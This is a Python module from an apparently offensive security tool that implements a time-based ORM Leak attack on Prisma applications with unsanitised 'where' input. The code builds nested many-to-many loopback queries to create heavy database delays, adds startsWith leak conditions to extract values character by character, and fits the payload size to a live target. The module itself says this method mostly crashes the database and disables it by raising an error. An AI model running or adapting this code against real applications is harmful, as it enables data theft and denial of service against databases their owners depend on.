import datetime, json, secrets

from requests.models import Response as Response

from plormber.utils.file import open_read
from plormber.attacks.time.base import BaseTimeORMLeakAttack
from plormber.attacks.time.exceptions import CouldNotFitParameters
from plormber.attacks.exceptions import InvalidOption

from colorama import Fore, Back, Style
from typing import Optional

class PrismaM2MTimeBasedORMLeak(BaseTimeORMLeakAttack):
    command_name = 'prisma-m2m'
    command_description = 'WARNING! This can crash servers fairly easily! Time-based ORM Leak attack for Prisma with unsanitised input into a `where` option. Use this if there is a many-to-many relationship to loop back and cause a very significant time delay.'

    trials_search_mean_tests = 5
    # Aim for a delay of 3 seconds on hit
    desired_delay = 3

    def __init__(self,
                 request_method: str = 'POST', request_format: str = 'json', max_leak_length: int = 256,
                 base_query_json: Optional[str] = None, base_query_file: Optional[str] = None, 
                 leak_query_json: Optional[str] = None, leak_query_file: Optional[str] = None,
                 contains_payload_json: Optional[str] = None, contains_payload_file: Optional[str] = None,
                 loopback_payload_json: Optional[str] = None, loopback_payload_file: Optional[str] = None,
                 start_contains_length: int = 10, additional_filter_opts: dict = {}, accept_risk: bool = False, **kwargs):
        
        super().__init__(**kwargs)
        assert accept_risk, f"{Fore.WHITE}{Back.RED}{Style.BRIGHT}WARNING! This module is dangerous and could crash the DBMS! Use --accept-risk to run.{Style.RESET_ALL}"
        assert base_query_file or base_query_json, f"{Fore.WHITE}{Back.RED}{Style.BRIGHT}Missing the base query{Style.RESET_ALL}"
        assert leak_query_file or leak_query_json, f"{Fore.WHITE}{Back.RED}{Style.BRIGHT}Missing the Prisma query that leaks a value for a column{Style.RESET_ALL}"
        assert contains_payload_file or contains_payload_json, f"{Fore.WHITE}{Back.RED}{Style.BRIGHT}Missing the Prisma query that uses the contains operation to cause a time delay{Style.RESET_ALL}"
        assert loopback_payload_file or loopback_payload_json, f"{Fore.WHITE}{Back.RED}{Style.BRIGHT}Missing the Prisma query that uses the contains operation to cause a time delay{Style.RESET_ALL}"
        
        self.request_method = request_method
        self.request_format = request_format
        self.max_leak_length = max_leak_length
        self.base_query = base_query_json
        if base_query_file:
            self.base_query = open_read(base_query_file).decode()
        self.check_option('base query', self.base_query, '{PAYLOAD}')
        self.leak_query = leak_query_json
        if leak_query_file:
            self.leak_query = open_read(leak_query_file).decode()
        self.check_option('leak query', self.leak_query, '{ORM_LEAK}')
        self.contains_payload = contains_payload_json
        if contains_payload_file:
            self.contains_payload = open_read(contains_payload_file).decode()
        self.check_option('contains payload', self.contains_payload, '{RANDOM_STRING}')
        self.loopback_payload = loopback_payload_json
        if loopback_payload_file:
            self.loopback_payload = open_read(loopback_payload_file).decode()
        self.check_option('loopback payload', self.loopback_payload, '{LOOP_BACK}')
        self.contains_len = start_contains_length
        self.additional_filter_opts = additional_filter_opts
        raise NotImplementedError(f"{Fore.WHITE}{Back.RED}{Style.BRIGHT}This exploit method does not work for time-based and only DoSes the DBMS{Style.RESET_ALL}")

 
    def check_option(self, option_name: str, option: str, expected_placeholder: str) -> bool:
        if expected_placeholder not in option:
            raise InvalidOption(f"InvalidOption for {option_name}: Missing {expected_placeholder} in value!")


    def trials_search(self):
        raise NotImplementedError("Needed to refactor this method")

    
    def fit_params(self):
        print(f"{Style.DIM}Finding a suitable array length that *should not* crash the database{Style.RESET_ALL}")
        diff = 10
        while diff > 1:
            loopback_p = self.add_orm_leak_payload(self.build_dos_payload(), secrets.token_hex(8), is_control=True)
            # Use a wildcard here so it would always match
            empty_p = self.add_orm_leak_payload(self.build_dos_payload(), secrets.token_hex(8))
            em_s_time = datetime.datetime.now()
            self.send_request(empty_p)
            em_e_time = datetime.datetime.now()
            em_time = (em_e_time - em_s_time).total_seconds()
            lb_s_time = datetime.datetime.now()
            r = self.send_request(loopback_p)
            lb_e_time = datetime.datetime.now()
            lb_time = (lb_e_time - lb_s_time).total_seconds()
            if (lb_time - em_time > PrismaM2MTimeBasedORMLeak.desired_delay):
                print(f"{Fore.GREEN}Fitted {Fore.CYAN}--start-contains-length {Fore.YELLOW}{Style.BRIGHT}{self.contains_len}{Style.RESET_ALL}")
                return super().fit_params()
            if r.status_code != 200:
                self.contains_len -= diff
                diff = diff//2
                break
            self.contains_len += diff

        if self.contains_len <= 0:
            raise CouldNotFitParameters("Got 4xx response on first request.")
        
        print(f"{Fore.GREEN}Fitted {Fore.CYAN}--start-contains-length {Fore.YELLOW}{Style.BRIGHT}{self.contains_len}{Style.RESET_ALL}")
    
        super().fit_params()


    def create_loopback(self):
        # Testing loopbacks
        loopbacks = 2
        # Only need to do 1 loop back since it causes such an explosion in query time
        base_str: str = self.contains_payload.replace("{RANDOM_STRING}", secrets.token_hex(8))
        p = json.loads(self.loopback_payload.replace("{LOOP_BACK}", base_str))
        for _i_loops in range(1, loopbacks):
            p = {"OR": [json.loads(self.contains_payload.replace("{RANDOM_STRING}", secrets.token_hex(8))), p]}
            p = json.loads(self.loopback_payload.replace("{LOOP_BACK}", json.dumps(p)))
        return {"OR": [json.loads(self.contains_payload.replace("{RANDOM_STRING}", secrets.token_hex(8))), p]}


    def build_dos_payload(self):

        payload = {
            "OR": [
                self.create_loopback()
                for _i in range(self.contains_len)
            ]
        }
        return payload
    

    def add_orm_leak_payload(self, payload: dict, test_val: str, is_control: bool = False):
        test_val = self.escape_chars(test_val)
        
        if is_control:
            # No "NOT" condition so a random string would return false
            # Used for establishing a baseline
            leak_query = json.loads(self.leak_query.replace("{ORM_LEAK}", test_val))
        else:
            # The "NOT" condition is used here so when there is a char hit then there would be a slower completion time
            leak_query = {
                "NOT": json.loads(self.leak_query.replace("{ORM_LEAK}", test_val))
            }

        or_payload = payload["OR"]
        new_or_payload = [leak_query]
        for or_elem in or_payload:
            or_elem["OR"] = [leak_query] + or_elem["OR"]
            new_or_payload.append(or_elem)

        payload["OR"] = new_or_payload
        return self.prepare_payload(payload)


    def escape_chars(self, to_escape: str) -> str:
        # Escape wildcard chars
        to_escape = to_escape.replace('%', '\\%')
        to_escape = to_escape.replace('_', '\\_')
        # Slicing to remove the ""
        return json.dumps(to_escape)[1:-1]


    def prepare_payload(self, p: dict) -> dict:
        if self.request_format == 'json':
            return json.loads(self.base_query.replace("{PAYLOAD}", json.dumps(p)))
        raise NotImplementedError("Have not implemented other formats yet")


    def send_request(self, payload: list | str | dict) -> Response:
        if self.request_format == 'json':
            return self.request(self.request_method, self.target, json=payload)
        raise NotImplementedError("Have not implemented other formats yet")


    @classmethod
    def add_options(cls, parser):
        parser = super().add_options(parser)

        parser.add_argument(
            '-m', '--request-method',
            help='The method to set for the request',
            default='POST',
            type=str
        )

        parser.add_argument(
            '-f', '--request-format',
            help='Format of the request',
            default='json',
            choices=['json']
        )

        parser.add_argument(
            '--max-leak-length',
            help='Max number of characters to leak',
            default=256,
            type=int
        )

        parser.add_argument(
            '--base-query-json',
            help='The base query in JSON format. Put "{PAYLOAD}" for where the payload should be inserted.',
            type=str
        )

        parser.add_argument(
            '--base-query-file',
            help='File path to the base query in JSON format. Put "{PAYLOAD}" for where the payload should be inserted.',
            type=str
        )

        parser.add_argument(
            '--leak-query-json',
            help='The prisma query in JSON format to execute that uses the "startsWith" operation to leak out a value char by char. Put "{ORM_LEAK}" in the position where you want test strings to be inserted.',
            type=str
        )

        parser.add_argument(
            '--leak-query-file',
            help='File path to the prisma query in JSON format to execute that uses the "startsWith" operation to leak out a value char by char. Put "{ORM_LEAK}" in the position where you want test strings to be inserted.'
        )

        parser.add_argument(
            '--start-contains-length',
            help='The starting length of the array with the contains operations to cause a delay on the next character is leaked.',
            default=10,
            type=int
        )

        parser.add_argument(
            '--contains-payload-json',
            help='The prisma query in JSON format that uses the "contains" operation to cause a time delay. Put "{RANDOM_STRING}" where random strings should be inserted.'
        )

        parser.add_argument(
            '--contains-payload-file',
            help='File path to the prisma query in JSON format that uses the "contains" operation to cause a time delay. Put "{RANDOM_STRING}" where random strings should be inserted.'
        )

        parser.add_argument(
            '--loopback-payload-json',
            help='The fragment of a prisma query that loops back on a many-to-many relationship. Put "{LOOP_BACK}" where loops and other queries should be inserted.'
        )

        parser.add_argument(
            '--loopback-payload-file',
            help='File path to the fragment of a prisma query that loops back on a many-to-many relationship. Put "{LOOP_BACK}" where loops and other queries should be inserted.'
        )

        parser.add_argument(
            '--additional-filter-opts',
            help='additional filter options to dump exactly what you want as a JSON string (e.g. {"email":{"contains":"admin"}})',
            default={},
            type=json.loads
        )

        parser.add_argument(
            '--accept-risk',
            help='This option is required in order to use. This method is DANGEROUS and could potentially crash the DBMS!',
            action='store_true'
        )

        return parser
